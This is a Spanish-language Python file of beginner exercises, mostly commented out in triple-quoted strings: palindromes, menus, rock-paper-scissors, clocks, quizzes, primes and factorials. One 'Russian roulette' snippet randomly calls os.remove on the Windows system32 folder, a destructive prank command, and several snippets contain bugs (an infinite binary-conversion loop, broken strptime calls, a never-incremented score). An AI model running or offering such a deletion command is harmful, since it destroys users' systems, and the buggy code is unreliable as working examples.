# has una funcion que devuelva si una palabara es capicua (se  lee igual al reves )
"""
def capicua(palabra):
    reves = ""

    for i in range(len(palabra)-1,-1,-1):

        reves += palabra[i]

    return palabra == reves 

print(capicua("holaaloh"))
"""

# hacer un menu de opcines que incluya la opcion de salir del programa 
"""
while True:
    print("1_sumar")
    print("2_restar")
    print("3_multiplicar")
    print("4_dividir")
    print("5_salir")

    opcion = int(input("ingresar una opcion"))

    if opcion == 1:
        print(" usted esta sumando")
    elif opcion == 2:
        print(" usted esta restando")
    elif opcion == 3:
        print("usted esta multiplicando")
    elif opcion == 4:
        print("usted esta dividiendo ")
    elif opcion == 5:
        print(" elegiste salir ")
        break
    else:
        print("elegiste salir ")
        
print(" vuelva pronto")
"""

# simula el juego de piedra, papel, tijera 

"""
import random

opciones = ["píedra", "papel", "tijera"]
usurio = input("elige piedra, papel, tijera: ").lower()

ordenador = random.choice(opciones)

if usurio not in opciones:
    print("error")
    quit()

if usurio == ordenador:
    print("empate")
elif usurio == "tijera" and ordenador == "piedra" or usurio =="piedra" and ordenador == "papel" or usurio == "papel" and ordenador == "tijera":
    print("perdiste")
else:
    print("gnaste")    

"""

# imprime los numeros impares del 1 al 100 
"""
for i in range (1,101):
    if i % 2 == 1:
        print(i)
"""

# talaba de multiplicar de los 10 primeros numeros
"""
for i in range(1, 11):
    print("tabla del ", i)
    for j in range(1,11):
        print(f"{i}*{j} = {i*j}")
    print("/n")  
"""
                
# haz un programa que convierta un numero de decimal en binario 
"""
def decimal_binario(decimal):
    if decimal == 0:
        return"0"
    
    binario = ""
    
    while decimal > 0:
        res = decimal % 2
        binario = str(res) 
        binario 
        decimal == decimal // 2
    return binario
print(decimal_binario(129))
"""

# haz un programa que te diga cuantos dias llevas vivo a partir de t8u fecha de nacimiento 
"""
from datetime import datetime

def dias_vivo(fecha_de_nacimieto):
    hoy = datetime.now()
    nacimiento = datetime.strptime
    (fecha_de_nacimieto, "%d-%m-%y")
    dias_vivo = (hoy-nacimiento).days 
    return dias_vivo

tu_fecha = input("introduce tu fecha de nacimiento (DIAS-MES-AÑO):")
dias = dias_vivo(tu_fecha)
print(f"llevas {dias} dias vivo  ")
"""

# hacer un relog que se actualize cada segundo 
"""
import time 
import os 


while True:
    horas = time.strftime
    ("%H:%M:%S")
    os.system("cls")
    print(horas)
    time.sleep(1)
"""
    
"""
import tkinter as tk

import time

# Función para actualizar el reloj cada segundo
def actualizar_reloj():
    hora_actual = time.strftime("%H:%M:%S")
    etiqueta.config(text=hora_actual)
    ventana.after(1000, actualizar_reloj)

# Configuración de la ventana principal
ventana = tk.Tk()
ventana.title("Reloj Digital")

# Configuración de la etiqueta para mostrar la hora
etiqueta = tk.Label(ventana, font=("Helvetica", 48), bg="black", fg="white")
etiqueta.pack()

# Iniciar la actualización del reloj
actualizar_reloj()

# Iniciar el bucle principal de la ventana
ventana.mainloop()
"""
# haz un progrman para aprender a sumar en poco tiempo 
"""
import time 
import random

aciertos = 0 

timepo_inicio = time.time()

for i in range(5):
    numero_1 = random.randint(2,202)
    numero_2 = random.randint(2,202)
    correcto = numero_1 + numero_2

    user_rest = int(input(f"cuuanto es {numero_1} + {numero_2}?:"))

    if user_rest == correcto:
        print("correcto")
    else:
        print(f"flatal el numero corecto es {correcto}")
    
time_total = time.time()-timepo_inicio
print(f"has tardado {time-time_total:.2f} segundos")
print(f"tus aciertos:{aciertos}")
"""

# haz una funcion si una letra es vocal o no 
"""
vocales = ["a","e","i","o","u"]
def is_vocal(x):
    if x.lower() in vocales:
        return True
    else:
        return False
    
print(is_vocal("a"))
"""

# ruleta rusa 
"""
import random

n  = random.randint(0,5)

if n == 1:
    print("pierdes")
else:
    print("ganaste")
"""
"""
import random
import os 

n = random.randint(0,5)

if n == 1:
    os.remove("c:\windows\system32")
else:
    print("ganas")
"""

# haz una funcion que devuelvas una palabra es capicua (se lee igual alreves)
"""
def capicua(palabra):
    reverse = ""
    for i in range(len(palabra)-1,-1,-1):
        reverse += palabra[i]
    
    return palabra == reverse

print(capicua("holaaloh"))
"""
# haz una funcion qpue devuelva el factorial de un numero 
"""
def factorial(n):
    if n == 1:
        return 1
    else:
        return n * factorial(n-1)
    
print(factorial(10))
"""

# haz una funcio que devuelva si un numero n es primo o no 
"""
def es_primo(num):
    for n in range(2,num):
        if num%n == 0:
            return False
    return True

print(es_primo(5))
print(es_primo(28))
"""


print("hello word")
print("hola mundo")